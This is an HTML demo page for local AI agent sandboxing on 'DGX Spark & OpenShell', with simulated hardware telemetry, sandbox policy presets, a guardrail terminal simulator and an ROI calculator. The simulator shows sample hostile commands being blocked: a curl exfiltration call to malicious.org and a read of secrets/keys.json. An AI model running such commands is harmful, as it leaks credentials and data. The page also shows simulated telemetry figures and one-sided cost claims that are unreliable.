@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NVIDIA DGX Spark & OpenShell - Local AI Workstation Sandbox</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@600;700;800;900&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <!-- FontAwesome icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-main: #06040c;
+            --bg-card: rgba(14, 11, 28, 0.7);
+            --border-card: rgba(255, 255, 255, 0.06);
+            --text-main: #f3f0f7;
+            --text-muted: #9590a3;
+            --clr-nvidia: #76b900;
+            --clr-nvidia-glow: rgba(118, 185, 0, 0.25);
+            --clr-accent: #9d4edd;
+            --clr-accent-glow: rgba(157, 78, 221, 0.2);
+            --clr-blue: #00b4d8;
+            --clr-blue-glow: rgba(0, 180, 216, 0.2);
+            --clr-error: #ff5f56;
+            --clr-success: #00e676;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            line-height: 1.6;
+            background-image: 
+                radial-gradient(circle at 15% 15%, rgba(118, 185, 0, 0.05) 0%, transparent 45%),
+                radial-gradient(circle at 85% 85%, rgba(157, 78, 221, 0.05) 0%, transparent 45%);
+            background-attachment: fixed;
+            min-height: 100vh;
+        }
+
+        h1, h2, h3, h4 {
+            font-family: 'Outfit', sans-serif;
+            letter-spacing: -0.02em;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+        }
+
+        /* Hero */
+        .hero {
+            text-align: center;
+            padding: 3rem 1rem;
+            position: relative;
+        }
+
+        .hero h1 {
+            font-size: 2.8rem;
+            font-weight: 900;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #76b900 0%, #00b4d8 50%, #9d4edd 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 2px 10px rgba(118, 185, 0, 0.2));
+        }
+
+        .hero p {
+            color: var(--text-muted);
+            font-size: 1.15rem;
+            max-width: 750px;
+            margin: 0 auto 2rem;
+        }
+
+        /* Pitch / ROI highlight */
+        .pitch-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.5rem;
+            margin-bottom: 3rem;
+        }
+
+        @media (max-width: 800px) {
+            .pitch-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .pitch-card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 16px;
+            padding: 2rem;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .pitch-card.cloud {
+            border-color: rgba(255, 95, 86, 0.2);
+            background: linear-gradient(135deg, rgba(255, 95, 86, 0.02) 0%, rgba(14, 11, 28, 0.7) 100%);
+        }
+
+        .pitch-card.local {
+            border-color: rgba(118, 185, 0, 0.25);
+            background: linear-gradient(135deg, rgba(118, 185, 0, 0.03) 0%, rgba(14, 11, 28, 0.7) 100%);
+        }
+
+        .pitch-card h3 {
+            font-size: 1.3rem;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .pitch-card.cloud h3 { color: var(--clr-error); }
+        .pitch-card.local h3 { color: var(--clr-nvidia); }
+
+        .pitch-value {
+            font-size: 2.2rem;
+            font-weight: 800;
+            font-family: 'Outfit', sans-serif;
+            margin: 1rem 0;
+        }
+
+        .pitch-card.cloud .pitch-value { color: var(--clr-error); }
+        .pitch-card.local .pitch-value { color: var(--clr-success); }
+
+        /* Tabs */
+        .tabs-nav {
+            display: flex;
+            justify-content: center;
+            gap: 0.6rem;
+            margin-bottom: 2.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background-color: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-card);
+            padding: 0.65rem 1.2rem;
+            border-radius: 50px;
+            color: var(--text-muted);
+            font-family: 'Outfit', sans-serif;
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .tab-btn:hover {
+            color: white;
+            background-color: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .tab-btn.active {
+            color: white;
+            background-color: var(--clr-nvidia);
+            border-color: var(--clr-nvidia);
+            box-shadow: 0 4px 15px var(--clr-nvidia-glow);
+        }
+
+        .tab-panel {
+            display: none;
+            animation: panelFade 0.4s ease-out forwards;
+        }
+
+        .tab-panel.active {
+            display: block;
+        }
+
+        @keyframes panelFade {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .glass-card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 20px;
+            padding: 2.5rem;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            margin-bottom: 2rem;
+        }
+
+        /* Telemetry Tab */
+        .telemetry-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        @media (max-width: 800px) {
+            .telemetry-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .telemetry-card {
+            background-color: rgba(255,255,255,0.02);
+            border: 1px solid var(--border-card);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .telemetry-gauge {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            border: 6px solid rgba(255,255,255,0.05);
+            border-top-color: var(--clr-nvidia);
+            margin: 1.2rem auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Outfit', sans-serif;
+            font-size: 1.6rem;
+            font-weight: 700;
+            position: relative;
+            transition: all 0.5s;
+        }
+
+        /* Editor & Code layout */
+        .editor-grid {
+            display: grid;
+            grid-template-columns: 1.1fr 0.9fr;
+            gap: 2rem;
+        }
+
+        @media (max-width: 850px) {
+            .editor-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .editor-window {
+            background-color: #080611;
+            border: 1px solid var(--border-card);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .window-bar {
+            background-color: rgba(255,255,255,0.02);
+            padding: 0.6rem 1rem;
+            border-bottom: 1px solid var(--border-card);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .window-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #ff5f56;
+        }
+        .window-dot.yellow { background-color: #ffbd2e; }
+        .window-dot.green { background-color: #27c93f; }
+
+        .window-title {
+            margin-left: 1rem;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            font-family: monospace;
+        }
+
+        .editor-textarea {
+            width: 100%;
+            height: 380px;
+            padding: 1.2rem;
+            background-color: #07050e;
+            border: none;
+            color: #72f1b8;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            outline: none;
+            resize: none;
+        }
+
+        /* Terminal styling */
+        .terminal-actions {
+            display: flex;
+            gap: 0.8rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .terminal-btn {
+            background-color: rgba(118, 185, 0, 0.1);
+            border: 1px solid var(--clr-nvidia);
+            color: var(--clr-nvidia);
+            padding: 0.6rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 600;
+            font-size: 0.85rem;
+            transition: all 0.3s;
+        }
+
+        .terminal-btn:hover {
+            background-color: var(--clr-nvidia);
+            color: #000;
+            box-shadow: 0 0 12px var(--clr-nvidia-glow);
+        }
+
+        .terminal-screen {
+            background-color: #040308;
+            border: 1px solid var(--border-card);
+            border-radius: 12px;
+            font-family: 'Fira Code', monospace;
+            padding: 1.5rem;
+            min-height: 320px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            overflow-y: auto;
+        }
+
+        .terminal-line {
+            margin-bottom: 0.75rem;
+            font-size: 0.85rem;
+        }
+
+        .term-prompt {
+            color: var(--clr-nvidia);
+            font-weight: bold;
+        }
+
+        .term-allowed {
+            color: var(--clr-success);
+            font-weight: 600;
+        }
+
+        .term-blocked {
+            color: var(--clr-error);
+            font-weight: 600;
+            background-color: rgba(255, 95, 86, 0.05);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            border-left: 3px solid var(--clr-error);
+            margin: 0.3rem 0;
+            display: inline-block;
+        }
+
+        /* Calculator */
+        .calc-form {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .calc-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .calc-group label {
+            display: block;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .calc-group input {
+            width: 100%;
+            padding: 0.8rem;
+            background-color: #0c091a;
+            border: 1px solid var(--border-card);
+            border-radius: 8px;
+            color: white;
+            outline: none;
+            font-size: 1rem;
+        }
+
+        .calc-group input:focus {
+            border-color: var(--clr-nvidia);
+        }
+
+        .calc-result-box {
+            margin-top: 2rem;
+            border-top: 1px solid var(--border-card);
+            padding-top: 1.5rem;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="hero">
+            <h1>NVIDIA DGX Spark & OpenShell</h1>
+            <p>Deploy secure, autonomous AI & Data Science agents locally on desktop hardware. Avoid cloud subscription leaks and thousands of euros in monthly API token bills.</p>
+        </header>
+
+        <!-- Zero-Token Pitch Grid -->
+        <section class="pitch-grid">
+            <div class="pitch-card cloud">
+                <div>
+                    <h3><i class="fa-solid fa-cloud"></i> Cloud LLM API Approach</h3>
+                    <p style="color: var(--text-muted); font-size: 0.9rem;">Auto-correcting agent loops (CrewAI, LangGraph) querying APIs. Millions of input/output tokens daily scale costs exponentially.</p>
+                </div>
+                <div>
+                    <div class="pitch-value">~ €2,400 /mo</div>
+                    <span style="font-size: 0.8rem; color: var(--clr-error); font-weight: bold;"><i class="fa-solid fa-triangle-exclamation"></i> Scaling with team size</span>
+                </div>
+            </div>
+
+            <div class="pitch-card local">
+                <div>
+                    <h3><i class="fa-solid fa-microchip"></i> DGX Spark Local Superchip</h3>
+                    <p style="color: var(--text-muted); font-size: 0.9rem;">Run high-parameter open models (Llama-3.1-70B, DeepSeek) locally in unified memory. Run unlimited agent steps completely free.</p>
+                </div>
+                <div>
+                    <div class="pitch-value">€0 /mo</div>
+                    <span style="font-size: 0.8rem; color: var(--clr-success); font-weight: bold;"><i class="fa-solid fa-circle-check"></i> Unlimited loops, 100% data privacy</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Navigation -->
+        <nav class="tabs-nav">
+            <button class="tab-btn active" data-tab="telemetry"><i class="fa-solid fa-gauge-high"></i> Hardware Telemetry</button>
+            <button class="tab-btn" data-tab="policies"><i class="fa-solid fa-shield-halved"></i> OpenShell Policies</button>
+            <button class="tab-btn" data-tab="terminal"><i class="fa-solid fa-terminal"></i> Sandbox Terminal</button>
+            <button class="tab-btn" data-tab="roi"><i class="fa-solid fa-calculator"></i> ROI Calculator</button>
+        </nav>
+
+        <!-- Tab 1: Telemetry -->
+        <section class="tab-panel active" id="panel-telemetry">
+            <div class="glass-card">
+                <h2 style="margin-bottom: 1.5rem;"><i class="fa-solid fa-desktop"></i> Personal AI Supercomputer Telemetry</h2>
+                <p style="color: var(--text-muted); margin-bottom: 2.5rem; font-size: 0.95rem;">Real-time hardware allocation specs for the local **Grace Blackwell GB10 Superchip** on your desk.</p>
+
+                <div class="telemetry-grid">
+                    <div class="telemetry-card">
+                        <h4>Blackwell GPU Load</h4>
+                        <div class="telemetry-gauge" id="gpu-gauge">12%</div>
+                        <p style="font-size: 0.8rem; color: var(--text-muted);">Tensor Core computations</p>
+                    </div>
+                    <div class="telemetry-card">
+                        <h4>Unified System Memory</h4>
+                        <div class="telemetry-gauge" id="ram-gauge" style="border-top-color: var(--clr-blue);">18 GB</div>
+                        <p style="font-size: 0.8rem; color: var(--text-muted);">Out of 128GB Unified Memory</p>
+                    </div>
+                    <div class="telemetry-card">
+                        <h4>Local Agent Sandbox Threads</h4>
+                        <div class="telemetry-gauge" id="threads-gauge" style="border-top-color: var(--clr-accent);">2</div>
+                        <p style="font-size: 0.8rem; color: var(--text-muted);">OpenShell active namespaces</p>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin-top: 2rem;">
+                    <button class="terminal-btn" id="run-model-btn" style="background-color: var(--clr-nvidia); color: #000; padding: 0.8rem 1.8rem; font-size: 1rem;"><i class="fa-solid fa-circle-play"></i> Query Local Model (Llama-3-70B)</button>
+                    <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.5rem;">Clicking triggers local offline inference, increasing GPU loads and memory allocations momentarily.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Tab 2: Policies -->
+        <section class="tab-panel" id="panel-policies">
+            <div class="glass-card">
+                <h2 style="margin-bottom: 1.5rem;"><i class="fa-solid fa-code-fork"></i> OpenShell Declarative Policy Configuration</h2>
+                <p style="color: var(--text-muted); margin-bottom: 2rem; font-size: 0.95rem;">Select an agent security profile preset. OpenShell applies these YAML policies at runtime to sandbox local system interfaces.</p>
+
+                <div class="editor-grid">
+                    <!-- Config Options -->
+                    <div style="display: flex; flex-direction: column; gap: 1rem;">
+                        <label for="policy-preset-select" style="font-weight: 600;">Load Sandbox Profile Template:</label>
+                        <select id="policy-preset-select" style="padding: 0.7rem; border-radius: 8px; border: 1px solid var(--border-card); background-color: #0a0715; color: white; cursor: pointer;">
+                            <option value="coder">Strict Software Coder Agent (python/node write limits)</option>
+                            <option value="auditor">Air-Gapped Data Science Auditor (fully blocks network exfiltration)</option>
+                            <option value="scraper">Web Ingestion Scraper (restricts network to HuggingFace/arXiv)</option>
+                        </select>
+
+                        <div style="background-color: rgba(255,255,255,0.01); border: 1px solid var(--border-card); padding: 1.2rem; border-radius: 12px; font-size: 0.85rem; color: var(--text-muted);">
+                            <h4 style="color: white; margin-bottom: 0.5rem;"><i class="fa-solid fa-circle-info"></i> How OpenShell Sandboxing Works</h4>
+                            <p>OpenShell utilizes Linux **Landlock** filesystem restrictions to prevent AI agents from reading sensitive system directory configurations, ssh credentials, or .env project parameters.</p>
+                            <p style="margin-top: 0.5rem;">It also hooks the network stack at the process level, allowing network calls to be blocked or routed dynamically.</p>
+                        </div>
+                    </div>
+
+                    <!-- Editor code window -->
+                    <div class="editor-window">
+                        <div class="window-bar">
+                            <div class="window-dot"></div>
+                            <div class="window-dot yellow"></div>
+                            <div class="window-dot green"></div>
+                            <span class="window-title" id="policy-filename-title">secure-coder-policy.yaml</span>
+                        </div>
+                        <textarea class="editor-textarea" id="policy-yaml-content" readonly></textarea>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Tab 3: Terminal -->
+        <section class="tab-panel" id="panel-terminal">
+            <div class="glass-card">
+                <h2 style="margin-bottom: 1rem;"><i class="fa-solid fa-shield-virus"></i> OpenShell Sandbox Guardrails Simulator</h2>
+                <p style="color: var(--text-muted); margin-bottom: 2rem; font-size: 0.95rem;">Select simulated commands to execute from our workspace. Watch the local OpenShell engine enforce policy restrictions.</p>
+
+                <div class="terminal-actions">
+                    <button class="terminal-btn" onclick="executeSimCommand('read-code')">python3 src/model.py</button>
+                    <button class="terminal-btn" onclick="executeSimCommand('read-secrets')">cat secrets/keys.json</button>
+                    <button class="terminal-btn" onclick="executeSimCommand('network-malicious')">curl http://malicious.org/exfil</button>
+                    <button class="terminal-btn" onclick="executeSimCommand('network-allowed')">git push origin main</button>
+                    <button class="terminal-btn" onclick="executeSimCommand('process-blocked')">apt-get install nmap</button>
+                </div>
+
+                <div class="editor-window">
+                    <div class="window-bar">
+                        <div class="window-dot"></div>
+                        <div class="window-dot yellow"></div>
+                        <div class="window-dot green"></div>
+                        <span class="window-title">OpenShell_Sandbox_Shell.sh</span>
+                    </div>
+                    <div class="terminal-screen" id="term-body">
+                        <div class="terminal-line" style="color: var(--text-muted); font-style: italic; text-align: center; margin-top: 5rem;">
+                            &lt; Terminal Ready. Click a suggested command above to test guardrail boundaries &gt;
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Tab 4: ROI -->
+        <section class="tab-panel" id="panel-roi">
+            <div class="glass-card">
+                <h2 style="margin-bottom: 1.5rem; text-align: center;"><i class="fa-solid fa-coins"></i> Local Hardware vs. Cloud Token ROI Calculator</h2>
+                <p style="color: var(--text-muted); text-align: center; margin-bottom: 2.5rem;">Estimate the return on investment of deploying local DGX Spark workstations compared to paying cloud LLM subscription APIs.</p>
+
+                <div class="calc-form">
+                    <div class="calc-group">
+                        <label for="roi-agents">Number of Active AI Agents / Users:</label>
+                        <input type="number" id="roi-agents" value="5">
+                    </div>
+                    <div class="calc-group">
+                        <label for="roi-tasks">Tasks Run per User / Agent daily:</label>
+                        <input type="number" id="roi-tasks" value="20">
+                    </div>
+                    <div class="calc-group">
+                        <label for="roi-cost">Estimated API Cost per Task Loop (€):</label>
+                        <input type="number" id="roi-cost" step="0.05" value="0.25">
+                        <span style="font-size: 0.75rem; color: var(--text-muted);">Usually €0.10 - €0.80 depending on agent depth and context size.</span>
+                    </div>
+
+                    <div class="calc-result-box">
+                        <div style="display: flex; justify-content: space-around; margin-bottom: 2rem; flex-wrap: wrap; gap: 1rem;">
+                            <div>
+                                <h4 style="color: var(--clr-error);">Monthly Cloud Tokens Billing</h4>
+                                <div class="pitch-value" id="roi-out-cloud" style="font-size: 2rem; margin: 0.5rem 0; color: var(--clr-error);">€1,500.00</div>
+                            </div>
+                            <div>
+                                <h4 style="color: var(--clr-nvidia);">Local DGX Spark Cost</h4>
+                                <div class="pitch-value" style="font-size: 2rem; margin: 0.5rem 0; color: var(--clr-success);">€0.00</div>
+                            </div>
+                        </div>
+
+                        <div style="background-color: rgba(118, 185, 0, 0.05); border: 1.5px dashed var(--clr-nvidia); padding: 1.5rem; border-radius: 12px;">
+                            <h3 style="color: var(--clr-success); margin-bottom: 0.5rem;">Estimated annual savings: <span id="roi-out-savings">€18,000.00</span></h3>
+                            <p style="font-size: 0.9rem; color: var(--text-muted);">Investing in a local workstation pays for itself within months, while guaranteeing absolute corporate data privacy.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        // Tab switching logic
+        const tabButtons = document.querySelectorAll(".tab-btn");
+        const tabPanels = document.querySelectorAll(".tab-panel");
+
+        tabButtons.forEach(btn => {
+            btn.addEventListener("click", () => {
+                tabButtons.forEach(b => b.classList.remove("active"));
+                tabPanels.forEach(p => p.classList.remove("active"));
+
+                btn.classList.add("active");
+                const tabId = btn.getAttribute("data-tab");
+                document.getElementById(`panel-${tabId}`).classList.add("active");
+            });
+        });
+
+        // Telemetry Simulation
+        const gpuGauge = document.getElementById("gpu-gauge");
+        const ramGauge = document.getElementById("ram-gauge");
+        const threadsGauge = document.getElementById("threads-gauge");
+        const runModelBtn = document.getElementById("run-model-btn");
+
+        let activeThreads = 2;
+        let baseGpu = 12;
+        let baseRam = 18;
+
+        function updateTelemetry() {
+            // Add subtle fluctuation
+            const gpuLoad = Math.min(100, Math.max(0, Math.floor(baseGpu + (Math.random() * 6 - 3))));
+            const ramLoad = Math.min(128, Math.max(0, Math.floor(baseRam + (Math.random() * 2 - 1))));
+            
+            gpuGauge.innerText = `${gpuLoad}%`;
+            ramGauge.innerText = `${ramLoad} GB`;
+            threadsGauge.innerText = activeThreads;
+        }
+
+        setInterval(updateTelemetry, 1500);
+
+        runModelBtn.addEventListener("click", () => {
+            runModelBtn.disabled = true;
+            activeThreads++;
+            baseGpu = 85;
+            baseRam = 48;
+            updateTelemetry();
+
+            setTimeout(() => {
+                baseGpu = 45;
+                setTimeout(() => {
+                    baseGpu = 12;
+                    baseRam = 22;
+                    activeThreads--;
+                    runModelBtn.disabled = false;
+                    updateTelemetry();
+                }, 1500);
+            }, 2000);
+        });
+
+        // Policies Presets
+        const policyPresets = {
+            "coder": {
+                name: "secure-coder-policy.yaml",
+                yaml: `# NVIDIA OpenShell Security Policy\n# Target Profile: Secure Coder (Software Engineering Agent)\n# Enforcement Layer: Landlock FS & Egress Network Filtering\n\nfilesystem:\n  allow_read:\n    - /workspace/my-project/**\n    - /usr/lib/**\n    - /usr/local/lib/**\n  allow_write:\n    - /workspace/my-project/src/**\n    - /workspace/my-project/tests/**\n    - /tmp/**\n  deny_read:\n    - /workspace/my-project/.env\n    - /workspace/my-project/secrets/**\n\nprocess:\n  allow_binaries:\n    - /usr/bin/python3\n    - /usr/bin/node\n    - /usr/bin/git\n    - /usr/bin/npm\n  deny_capabilities:\n    - CAP_SYS_ADMIN\n    - CAP_NET_RAW\n\nnetwork:\n  egress:\n    - destination: api.anthropic.com\n      ports: [443]\n      binary: /usr/bin/curl\n    - destination: registry.npmjs.org\n      ports: [443]\n      binary: /usr/bin/npm\n    - destination: '*.github.com'\n      ports: [443]\n      binary: /usr/bin/git\n\ninference:\n  routes:\n    - pattern: '*.py'\n      backend: local/nemotron\n    - pattern: '*'\n      backend: anthropic/claude-sonnet`
+            },
+            "auditor": {
+                name: "data-auditor-policy.yaml",
+                yaml: `# NVIDIA OpenShell Security Policy\n# Target Profile: Data Auditor (Data Science & Analytics Agent)\n# Enforcement Layer: Landlock FS & Network Air-Gap Control\n\nfilesystem:\n  allow_read:\n    - /workspace/data/**\n    - /workspace/notebooks/**\n    - /usr/lib/python3/**\n  allow_write:\n    - /workspace/notebooks/**\n    - /workspace/reports/**\n    - /tmp/**\n  deny_read:\n    - /workspace/config/database_creds.json\n    - /home/user/.ssh/**\n\nprocess:\n  allow_binaries:\n    - /usr/bin/python3\n    - /usr/bin/pip\n  deny_capabilities:\n    - CAP_SYS_ADMIN\n    - CAP_NET_RAW\n\nnetwork:\n  egress: []  # Fully Air-Gapped: Blocks all outbound HTTP/TCP requests to prevent data exfiltration\n\ninference:\n  routes:\n    - pattern: '*'\n      backend: local/nemotron-4-340b  # Directs all inference to local offline hardware model in DGX Spark memory`
+            },
+            "scraper": {
+                name: "autonomous-scraper-policy.yaml",
+                yaml: `# NVIDIA OpenShell Security Policy\n# Target Profile: Autonomous Scraper (Data Ingestion Agent)\n# Enforcement Layer: Landlock FS & Granular Egress Whitelists\n\nfilesystem:\n  allow_read:\n    - /workspace/scraper/**\n    - /usr/lib/**\n  allow_write:\n    - /workspace/scraper/raw_html/**\n    - /tmp/**\n\nprocess:\n  allow_binaries:\n    - /usr/bin/python3\n    - /usr/bin/curl\n  deny_capabilities:\n    - CAP_SYS_ADMIN\n    - CAP_NET_RAW\n\nnetwork:\n  egress:\n    - destination: '*.wikipedia.org'\n      ports: [80, 443]\n      binary: /usr/bin/curl\n    - destination: '*.arxiv.org'\n      ports: [443]\n      binary: /usr/bin/curl\n    - destination: huggingface.co\n      ports: [443]\n      binary: /usr/bin/python3\n\ninference:\n  routes:\n    - pattern: '*'\n      backend: local/nemotron`
+            }
+        };
+
+        const policySelect = document.getElementById("policy-preset-select");
+        const policyTitle = document.getElementById("policy-filename-title");
+        const policyContent = document.getElementById("policy-yaml-content");
+
+        function loadPresetPolicy() {
+            const data = policyPresets[policySelect.value];
+            if (data) {
+                policyTitle.innerText = data.name;
+                policyContent.value = data.yaml;
+            }
+        }
+
+        policySelect.addEventListener("change", loadPresetPolicy);
+        window.addEventListener("DOMContentLoaded", loadPresetPolicy);
+
+        // Terminal Simulator
+        const termBody = document.getElementById("term-body");
+
+        const termResponses = {
+            "read-code": {
+                cmd: "python3 src/model.py",
+                logs: [
+                    "🔐 [OpenShell Audit] Validating binary '/usr/bin/python3'... ALLOWED.",
+                    "🔐 [OpenShell Audit] Validating path read '/workspace/my-project/src/model.py'... ALLOWED.",
+                    "🖨️ [Output] Model loader script initialized successfully. Ready."
+                ]
+            },
+            "read-secrets": {
+                cmd: "cat secrets/keys.json",
+                logs: [
+                    "🔐 [OpenShell Audit] Validating binary '/usr/bin/cat'... BLOCKED.",
+                    "🛑 [Security Exception] Binary '/usr/bin/cat' is not listed in allow_binaries configuration.",
+                    "❌ Shell output: Permission denied."
+                ]
+            },
+            "network-malicious": {
+                cmd: "curl http://malicious.org/exfil?data=env",
+                logs: [
+                    "🔐 [OpenShell Audit] Validating binary '/usr/bin/curl'... ALLOWED.",
+                    "🔐 [OpenShell Audit] Checking network egress rule for 'malicious.org'... BLOCKED.",
+                    "🛑 [Security Exception] Egress connection to 'malicious.org' blocked by network policy rules.",
+                    "❌ Shell output: Connection refused (network-egress-exception)."
+                ]
+            },
+            "network-allowed": {
+                cmd: "git push origin main",
+                logs: [
+                    "🔐 [OpenShell Audit] Validating binary '/usr/bin/git'... ALLOWED.",
+                    "🔐 [OpenShell Audit] Checking network egress rule for 'github.com'... ALLOWED.",
+                    "🖨️ [Output] Enumerating objects: 4, done. Pushed successfully to github.com."
+                ]
+            },
+            "process-blocked": {
+                cmd: "apt-get install nmap",
+                logs: [
+                    "🔐 [OpenShell Audit] Validating binary '/usr/bin/apt-get'... BLOCKED.",
+                    "🛑 [Security Exception] Binary '/usr/bin/apt-get' is not in allow_binaries list.",
+                    "❌ Shell output: Operation not permitted."
+                ]
+            }
+        };
+
+        function executeSimCommand(key) {
+            const data = termResponses[key];
+            if (!data) return;
+
+            termBody.innerHTML = "";
+            
+            // Print command line
+            const lineCmd = document.createElement("div");
+            lineCmd.className = "terminal-line";
+            lineCmd.innerHTML = `<span class='term-prompt'>openshell-sandbox$</span> <span>${data.cmd}</span>`;
+            termBody.appendChild(lineCmd);
+
+            // Print logs sequentially
+            data.logs.forEach((log, idx) => {
+                setTimeout(() => {
+                    const logLine = document.createElement("div");
+                    logLine.className = "terminal-line";
+                    
+                    if (log.includes("ALLOWED")) {
+                        logLine.innerHTML = log.replace("ALLOWED", "<span class='term-allowed'>ALLOWED</span>");
+                    } else if (log.includes("BLOCKED") || log.includes("Security Exception")) {
+                        logLine.innerHTML = `<span class='term-blocked'>${log}</span>`;
+                    } else {
+                        logLine.innerHTML = `<span style='color: var(--text-muted);'>${log}</span>`;
+                    }
+                    
+                    termBody.appendChild(logLine);
+                    termBody.scrollTop = termBody.scrollHeight;
+                }, (idx + 1) * 300);
+            });
+        }
+
+        // ROI Calculator logic
+        const inAgents = document.getElementById("roi-agents");
+        const inTasks = document.getElementById("roi-tasks");
+        const inCost = document.getElementById("roi-cost");
+        const outCloud = document.getElementById("roi-out-cloud");
+        const outSavings = document.getElementById("roi-out-savings");
+
+        function calculateROI() {
+            const agents = parseFloat(inAgents.value) || 0;
+            const tasks = parseFloat(inTasks.value) || 0;
+            const cost = parseFloat(inCost.value) || 0;
+
+            const dailyCost = agents * tasks * cost;
+            const monthlyCost = dailyCost * 30; // 30 days
+            const annualCost = monthlyCost * 12;
+
+            outCloud.innerText = `€${monthlyCost.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+            outSavings.innerText = `€${annualCost.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+        }
+
+        inAgents.addEventListener("input", calculateROI);
+        inTasks.addEventListener("input", calculateROI);
+        inCost.addEventListener("input", calculateROI);
+
+        window.addEventListener("DOMContentLoaded", calculateROI);
+    </script>
+</body>
+</html>
